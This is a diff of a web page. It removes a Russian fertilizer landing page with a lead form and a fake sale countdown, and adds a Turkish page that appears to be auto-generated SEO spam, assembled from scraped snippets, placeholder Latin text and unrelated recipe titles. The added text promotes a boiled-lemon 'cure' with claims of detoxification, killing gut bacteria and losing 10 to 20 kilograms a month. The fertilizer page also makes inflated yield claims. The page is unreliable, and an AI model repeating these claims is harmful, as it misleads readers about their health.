-                            <img src="build/images/order-img3.png" alt="" />
-                            <h4>ДОСТАВКА</h4>
-                            <p>Надежно упаковываем и отправляем ваш заказ</p>
-                        </li>
-                        <li>
-                            <img src="build/images/order-img4.png" alt="" />
-                            <h4>ПОЛУЧЕНИЕ</h4>
-                            <p>Вы получаете посылку и оплачиваете</p>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-        <div class="info">
-            <div class="info__body">
-                <div class="info__title">
-                    <h2>AgroMax<sup>®</sup>
-                    </h2>
-                    <h3>Органическое удобрение
-                        <span>для усиления роста садовых культур</span>
-                    </h3>
-                    <p>На 50% больше урожая каждый месяц</p>
-                </div>
-                <div class="info__list">
-                    <div class="info__list-pack">
-                        <img src="build/images/info-pack.png" alt="" />
-                    </div>
-                    <div class="info__list-body">
-                        <ul>
-                            <li>
-                                1 упаковка = 50 килограммам конского навоза для удобрения
-                            </li>
-                            <li>
-                                100% органическое удобрение, насыщенное питательными веществами
-                            </li>
-                            <li>
-                                Всход любых семян в 2 раза быстрее
-                            </li>
-                            <li>
-                                Стимулирует рост саженцев и черенков
-                            </li>
-                        </ul>
-                    </div>
-                </div>
-                <div class="info__action">
-                    <div class="info__action-note">
-                        <p>*при заказе набора</p>
-                    </div>
-                    <div class="info__action-top">
-                        <div class="info__action-title">
-                            <p>Успейте оформить заказ
-                                <span>ПО АКЦИИ!</span>
-                            </p>
-                        </div>
-                        <div class="info__action-price dec">
-                            <div class="info__action-price__new">
-                                <p>Специальная цена
-                                    <span>
-										<span class="new_price_val">149</span>
-                                    <span class="new_price_cur">руб</span>
-                                    </span>
-                                </p>
-                            </div>
-                        </div>
-                        <div class="info__action-timer">
-                            <p>ДО КОНЦА
-                                <span>АКЦИИ</span> ОСТАЛОСЬ</p>
-                            <div id="countdown-2"></div>
-                        </div>
-                        <div class="info__action-price mob">
-                            <div class="info__action-price__new">
-                                <p>Специальная цена
-                                    <span>
-										<span class="new_price_val">149</span>
-                                    <span class="new_price_cur">руб</span>
-                                    </span>
-                                </p>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="info__action-form" id="form">
-                        <form class="landing__form">
-                            <select name="country"></select>
-                            <input type="text" name="name" placeholder="Ваше имя">
-                            <input type="tel" name="phone" placeholder="Номер телефона">
-                            <button type="submit">Заказать AgroMax</button>
-                        </form>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <footer>
-        <div class="footer__body">
-
-            <p>ООО "АГРОМАКС" 112984, Россия, Москва, Пушкина улица, 127, ИНН 7712947115; ОГРН 1117569145765 </p>
-
-            <a href="/politic.html">Политика конфиденциальности</a>
-            <a href="/oferta.html">Публичная оферта</a>
-
-        </div>
-    </footer>
-    <script src="build/js/slick.min.js"></script>
-    <script src="build/js/jquery.time-to.js"></script>
-    <script src="build/js/main.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-url-parser/2.3.1/purl.min.js"></script>
-    <script src="leadprofit.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.1.6/owl.carousel.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/3.3.4/jquery.inputmask.bundle.min.js"></script>
-    <script>
-        $(document).ready(function() {
-            $("form").leadprofit({
-                hash: "544f58e8-623d-4fb9-b0ed-dec38873bb3c"
-            }).leadprofitSubmit({
-                confirmUrl: 'confirm.html',
-                counterParams: {
-                    country: "{country}",
-                    version: document.location.pathname.replace(/\/+/g, '').replace('landings', '').replace('index.html', '').replace('index2.html', '').replace('confirm.html', '')
-                }
-            });
-        });
-    </script>
-    <script src="price.js"></script>
-    <script>
-        $(".slide-one").owlCarousel({
-            margin: 0,
-            nav: false,
-            startPosition: '544f58e8-623d-4fb9-b0ed-dec38873bb3c',
-            loop: true,
-            center: true,
-            items: 1,
-            dots: true,
-        });
-    </script>	
+<body id="MD6T7SwkqFV5">
+<div id="header">
+	<div id="menu">
+		<ul>
+			<li class="current_page_item"><a href="index.html">Homepage</a></li>
+			<li id="mPFTjIWbMZAw4"><a href="privacy-policy.html">Privacy policy</a></li>
+			<li id="twQYbWVkq2xoo"><a href="terms.html">Terms and Conditions</a></li>
+			<li id="6WvEzNAW"><a href="photo.html">Photo gallery</a></li>
+			<li id="klxxUnfB"><a href="contact.html">Contacts</a></li>
+		</ul>
+	</div>
+	<!-- end #menu -->
+	<div id="logo">
+		<h1>Haşlanmış limon</h1>
+	</div>
+	<hr />
+</div>
+<!-- end #header -->
+<!-- end #header-wrapper -->
+<!-- end #logo -->
+<div id="page">
+	<div id="page-bgtop">
+		<div id="page-bgbtm">
+			<div id="content">
+				<div class="post"  id="5Ro7Gxoyts4Kg">
+					<p class="meta"  id="tiSnC7BhBAY"><span class="date">2021.02.22 17:36</span> Posted by <a href="#">Someone</a></p>
+					<h2 class="title"><a href="#">Haşlanmış Limon Nasıl Yapılır? &#8211; Organik Günler</a></h2>
+					<div class="entry" id="Y4NFy61qXy">
+					<hr><br><br>
+			<iframe width="560" height="315" src="https://www.youtube.com/embed/_hgFcePN7tA"><div class="mc_vtvc_th b_canvas"><div class="cico" style="width:234px;height:131px;"><div class="rms_iac" style="height:131px;line-height:131px;width:234px;" data-height="131" data-width="234" data-alt="HAŞLANMIŞ LİMON KÜRÜNÜ BİR DE BU ŞEKİLDE DENEYİN 15 GÜNDE 10 KİLO VERDİREN ZAYIFLAMA KÜRÜ" data-role="presentation" data-class="rms_img" data-src="https://th.bing.com/th?id=OVP.3aA7_TCTx_diHmQG0SA1YwEsDh" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+						<span> </span> Anasayfa Şifalı Bitkiler Doğal Kürler Bitkisel Yağlar Doğal Bakım Organik Bahçe <span> <i> </i> </span> <span> <i> </i> </span> <span> </span> Anasayfa Şifalı Bitkiler Doğal Kürler Bitkisel Yağlar Doğal Bakım Organik Bahçe <span> <i> </i> </span> <span> <i> </i> </span> <span> </span> <span> <i> </i> </span> <span> <i> </i> </span> Bitki Çayları <h1> Haşlanmış Limon Nasıl Yapılır?</h1> <span> <span> OrganikAbla </span> </span> <span> 21 Aralık 2016</span> 5 comments 2 min read </p> <p> Limon, C vitamini, kalsiyum, potasyum, magnezyum ve demir içermekle kalmıyor, aynı zamanda hem antioksidan etkisi mevcut hem de lif kaynağı bir besindir.</p> <p> Aç karnına haşlanmış limon içilirse, kahve veya soda gibi mideye dokunmaz, tam tersine vücutta detox etkisi yaratarak bağırsaklarınızdaki bakteriler yok eder, vücudu besler ve ihtiyacınız olan tüm enerjiyi karşılar.</p> <p> Eğer sabah uyandığınızda güne limonlu su içerek başlarsanız, her şeyden önce güne kendinize taze ve ferah hissederek başlayacaksınız. Vücudunuzu kötü toksinlerden mikroplardan arıtacak ve sindirim sistemine yardımcı olacak.</p> <h2> Haşlanmış Limon Zayıflatıyor</h2> <p> Haşlanmış limon ayrıca vücuttaki yağ yakımını hızlandırarak zayıflamayı destekler. Vücudu zararlı toksinlerden arındırır, mikroplardan temizler </p> <h2> Haşlanmış Limon Nasıl Hazırlanır?</h2> <p> <strong> Haşlanmış Limon Tarifi için kullanabileceğiniz malzemeler;</strong> 4-5 adet limon, 5 diş sarımsak, küçük bir parça zencefil ve 2 litre su.</p> <p> Limonların kabukları soyularak suyu sıkılır. Limonun posası ile kabuklarını bir kenarda bekletilir çünkü karışımın içine ekleyeceğiz. Daha sonra blender yardımıyla sarımsakları ve zencefili güzelce parçalıyoruz. Sıktığımız limon suyu ile blendırdan geçirilen malzemeler bir tencerede karıştırılır.</p> <p> Başka bir tencere içerisinde 2 litrelik suyumuzu içerisine ayırdığımız limon kabukları ve posasını da ekleyerek kaynatıyoruz. Su kaynamaya başlayınca diğer tenceredeki karışımı da ekleyip kaynatmaya devam ediyoruz. Ortalama 10 dakika kadar bu şekilde kaynadıktan sonra ocağı kapatıp karışımı soğumaya bırakılır. Ilık veya soğuk bir kıvama geldiğinde haşlanmış limon kürünüz hazır demektir.</p> <p> Bu karışımı her sabah aç karnına 1 çay bardağı içebilirsiniz. <strong> Haşlanmış limon</strong> kürü içerek 20 kilo kadar zayıflayan okurlarımız mevcut. </p> <p> Siz de mutlaka deneyin. Ayrıca mide ve sindirim sistemi sağlığı için de çok faydalı olacaktır. Özel bir hastalığı olanların doktor gözetiminde kullanması önerilir. Sağlıcakla kalınız..</p> <p> Haşlanmış Limon Tarifini Mutlaka sevdiklerimizle paylaşalım, herkes faydalansın.</p> <p> <span> -------- Sponsorlu --------</span> <br/> </p> haşlanmış limon <h4> OrganikAbla</h4> <p> Organik, Doğal ve Sağlıklı Yaşam Günlerine beraber ilerlemek için makalelerimi takip edin... Birlikte organik yaşama sımsıkı tutunalım.</p> View all posts <span> <i> </i> </span> <span> Hastalıklara Derman Zeytin Yaprağı Çayı</span> <span> <i> </i> </span> <span> Menengiç Nedir? Menengiç Kahvesi Hakkında Bilgi</span> <h4> 5 comments</h4> <b> köylü</b> <span> dedi ki:</span> 30 Aralık 2016, 01:59 <p> Bir defa hazirlayip saklayabilir miyiz yoksa her gün tekrar hazırlanmalı mı</p> <b> ozlemce</b> <span> dedi ki:</span> 2 Şubat 2017, 10:07 <p> Hersabah bir bardak diyor. Iki lire sudan baya cok cikar. Heralde saklayip bitene kadar hergun iciliyor.</p> <b> MERAL ÜNER</b> <span> dedi ki:</span> 2 Şubat 2017, 04:45 <p> Kaynatılan limon suyu C vitamini kaybına sebep olur:Bunun yerine ayrılan limon suyu daha SONRA ilave edilmeli</p> <b> Songul</b> <span> dedi ki:</span> 2 Şubat 2017, 21:52 <p> Sarımsak koymasak olmaz mı pek aram yokda</p> <b> ertan</b> <span> dedi ki:</span> 18 Nisan 2018, 00:49 <p> hazırlandıktan sonra posa ve kabuklar içinde kalmaya devam etmeli mi?</p> <h4> You may also like</h4> Bitki Çayları Doğal Kürler <h2> Aramalı Detox Suyu Nasıl Yapılır? </h2> <p> DETOX SUYU NEDİR? DETOKS SUYU İLE ZAYIFLAMA Detox suyu son zamanlarda oldukça popüler olan aromalı sulardır. Kişiler zayıflamak amacıyla, toksin atmak amacıyla, suya aroma katması amacıyla detox suyu tercih ederler...</p> <span> <span> OrganikAbla </span> </span> Bitki Çayları Bitkisel Yağlar Şifalı Bitkiler <h2> Limon Otu Nedir, Faydaları ve Kullanımı Nelerdir? </h2> <p> Aromatik Kokulu Limon Otu Yaprakları, Gövdesi ve Elde Edilen Esans Yağı ile Çok Çeşitli Kullanım Alanlarına Sahip, Üstelik Tıbbi Anlamda Faydaları Olan bir bitkidir. LİMON OTU NEDİR? Bilimsel adı Cymbopogon citratus...</p> <span> <span> OrganikAbla </span> </span> Bitki Çayları <h2> Hastalıklara Derman Zeytin Yaprağı Çayı </h2> <p> Zeytin ağacı yaprağı antik çağlardan beri tıbbi amaçla sağlık alanında kullanılmaktadır. Bilim adamları zeytin ağacının tüm ağaç türleri arasında en eski türlerinden olduğunu da doğrulayarak günümüze kadar üzerinde bir...</p> <span> <span> OrganikAbla </span> </span> <h4> Posts<span> </span> </h4> <h6> ANASON TOHUMU Bu Bitkiyi Kırışıklık Estetik Kremleri Yerine Kullanın </h6> <span> 15 Aralık 2019</span> <h6> Pazardan yada Marketten Meyve Sebze Almadan Önce Bilmeniz Gereken </h6> <span> 1 Kasım 2019</span> <h6> Tiroidin Olumsuz Etkilerinden Kurtaran Bitki </h6> <span> 1 Kasım 2019</span> <h6> Siyatik Ağrıları Geçiren 2 Egzersiz </h6> <span> 1 Kasım 2019</span> <h6> 2 Günde Yüzdeki Gıdı Sarkmasından Kurtarıcı Tavsiye </h6> <span> 1 Kasım 2019</span> <h4> REKLAM</h4> <p> Copyright &copy; 2021 · Created by MBG · Powered by WordPress </p> <span> <i> </i> </span> Anasayfa Şifalı Bitkiler Doğal Kürler Bitkisel Yağlar Doğal Bakım Organik Bahçe <h4> Posts</h4> <h6> ANASON TOHUMU Bu Bitkiyi Kırışıklık Estetik Kremleri Yerine Kullanın </h6> <span> 15 Aralık 2019</span> <h6> Pazardan yada Marketten Meyve Sebze Almadan Önce Bilmeniz Gereken </h6> <span> 1 Kasım 2019</span> <h6> Tiroidin Olumsuz Etkilerinden Kurtaran Bitki </h6> <span> 1 Kasım 2019</span> <h6> Siyatik Ağrıları Geçiren 2 Egzersiz </h6> <span> 1 Kasım 2019</span> <h6> 2 Günde Yüzdeki Gıdı Sarkmasından Kurtarıcı Tavsiye </h6> <span> 1 Kasım 2019</span>
+					</div>
+					<div><a href="#" class="links">View Full Story</a></div>
+				</div>
+		
+			</div>
+			<!-- end #content -->
+			<div id="sidebar">
+				<ul>
+					<li>
+						<h2>Aliquam tempus</h2>
+						<p>Mauris vitae nisl nec metus placerat perdiet est. Phasellus dapibus semper urna. Pellentesque ornare, orci in consectetuer hendrerit, volutpat.</p>
+					</li>
+					<li>
+						<h2>Pellenteque ornare </h2>
+						<img src="img/e3335a4bf8b571ec002386637c7b1316.jpg" width="50%"/>
+					<ul>
+<li><a href="index.html">Haşlanmış Limon Sayesinde 20 Kilo Verebilirsiniz - YemekEv.com</a><br> Haşlanmış Limon Kürü (Mucize Kür) 01.08.2018 13:47 tarihinde yayınlandı. Bu sayfa 01.08.2018 13:47 tarihinde güncellendi. Soğuk İçecekler İçecek Tarifleri. Paylaşmadan Gitme: Tarifi dene, fotoğrafını paylaş ...</li>
+<li><a href="1.html">Kaynamış Limon Suyu İle Kilo Verme. Haşlanmış Limon ile ...</a><br> Haşlanmış tavuk yemekleri öğrenmek istiyorsanız haşlanmış tavukla yapılan bu farklı, nefis ve pratik tarifleri görünce çok seveceksiniz, eminiz.</li>
+<li><a href="2.html">Haşlanmış Tavuk Yemekleri: Haşlanmış Tavukla Yapılan 10 ...</a><br> Haşlanmış limon ile zayıflama diyeti son günlerde insanlar tarafından oldukça merak ediliyor. 1 ayda 20 kilo verdirdiği söylenen haşlanmış limon ile zayıflama diyetinin nasıl yapıldığını ne gibi faydalar sağladığını sizler için araştırdık. İşte tam bir c vitamini kaynağı olan haşlanmış limon ile zayıflama diyeti.</li>
+<li><a href="3.html">Haşlanmış Limon Nasıl Yapılır? - Dr Sağlık</a><br> Haşlanmış limon diyeti hem zayıflamanızı hem de vücudunuzun enerji depolamasını sağlıyor. C vitamini deposu olmasının yanı sıra; potasyum, kalsiyum, demir ve magnezyum bir yandan vücudunuzu besliyor bir yandan da yağ yakma hızını arttırarak zayıflamanıza destek oluyor.</li>
+<li><a href="4.html">Haşlanmış Limon Diyeti | E-Zayıflama - Zayıflamada ...</a><br> Ayda 10 kilo verdiren haşlanmış limon diyeti. Diyetler çoğu kadın için günlük hayatın rutinidir. O kadar çok diyet çeşidi vardık ki, bazen hangisini seçeceğimiz konusunda kararsız ...</li>
+<li><a href="5.html">Haşlanmış Limon Sayesinde 20 Kilo Verebilirsiniz</a><br> Haşlanmış Limon Diyeti Tam bir C vitamini kaynağı olan limon ile zayıflama k mümkündür. Kısa bir süre içerisinde forma kavuşmamıza, yağ yakmamıza, daha sağlıklı bir yaşam geçirmeye adım atmamız yardımcı limon ile zayıflama k için yapacaklarımız ise oldukça basit.</li>
+<li><a href="6.html">Haşlanmış Limon Diyeti Sayesinde Ayda 10 Kilo Verin!</a><br> Haşlanmış limon kürünün faydaları . Yağ yakımını hızlandırıcı özelliği vardır. Kan şekerinizi dengeleyerek aniden bastıran açlık krizlerinizin ve şeker isteğinizin önüne geçer. Bağırsaklardaki bakterilerin temizlenmesine yardımcı olur.</li>
+<li><a href="7.html">Haşlanmış Limon Kürü Nedir, Nasıl Yapılır? Faydaları ...</a><br> Haşlanmış Limon Diyeti Sayesinde Ayda 10 Kilo Verin! Posted by Medya Hatun Tanış Ekim 25, 2019 Diyet artık her yaştan insanın çeşitli amaçlar için hayatlarına dahil ettiği bir rutin haline geldi.</li>
+<li><a href="8.html">Kaynamış Limon Suyu Zayıflatır Mı? | Haşlanmış Limon Suyu ...</a><br> Limon, C vitamini, kalsiyum, potasyum, magnezyum ve demir kapsamakla kalmıyor, aynı zamanda hem antioksidan tesiri mevcut hem de lif kaynağı bir besindir.Aç karnına haşlanmış limon içilirse, kahve veya soda gibi mideye değmez, bütün tersine bedende detox tesiri yaratarak bağırsaklarınızdaki bakt</li>
+<li><a href="9.html">Ayda 10 kilo verdiren haşlanmış limon diyeti</a><br> Haşlanmış limon ile dilediğiniz kadar zayıflayabilir ve hızlandıracağınız metabolizmanız sayesinde ideal kilonuza hemen ulaşabilirsiniz. Hem besleyici hem sağlıklı hem de en tazesini şimdi bulabileceğiniz limon ile fazla kilolarınıza veda etmek isterseniz, sizi bekleyen bu güzel tarife hemen göz atmalı ve uygulamaya ...</li>
+</ul>
+					</li>
+					<li>
+						<h2>Category</h2>
+<ul>
+<li><a href="index.html">Haşlanmış Limon Sayesinde 20 Kilo Verebilirsiniz - YemekEv.com</a></li>
+<li><a href="1.html">Kaynamış Limon Suyu İle Kilo Verme. Haşlanmış Limon ile ...</a><br></li>
+<li><a href="2.html">Haşlanmış Tavuk Yemekleri: Haşlanmış Tavukla Yapılan 10 ...</a><br></li>
+<li><a href="3.html">Haşlanmış Limon Nasıl Yapılır? - Dr Sağlık</a><br></li>
+<li><a href="4.html">Haşlanmış Limon Diyeti | E-Zayıflama - Zayıflamada ...</a><br></li>
+<li><a href="5.html">Haşlanmış Limon Sayesinde 20 Kilo Verebilirsiniz</a><br></li>
+<li><a href="6.html">Haşlanmış Limon Diyeti Sayesinde Ayda 10 Kilo Verin!</a><br></li>
+<li><a href="7.html">Haşlanmış Limon Kürü Nedir, Nasıl Yapılır? Faydaları ...</a><br></li>
+<li><a href="8.html">Kaynamış Limon Suyu Zayıflatır Mı? | Haşlanmış Limon Suyu ...</a><br></li>
+<li><a href="9.html">Ayda 10 kilo verdiren haşlanmış limon diyeti</a><br></li>
+</ul>
+					</li>
+				</ul>
+			</div>
+			<!-- end #sidebar -->
+			<div style="clear: both;">&nbsp;</div>
+		</div>
+		<!-- end #page -->
+	</div>
+</div>
+<div id="footer-bgcontent">
+	<div id="footer">
+		<p>Copyright (c) 2008 Sitename.com. All rights reserved. Design by Free CSS Templates.</p>
+		<p></p>
+	</div>
+	<!-- end #footer -->
+</div>
 </body>
-
 </html>
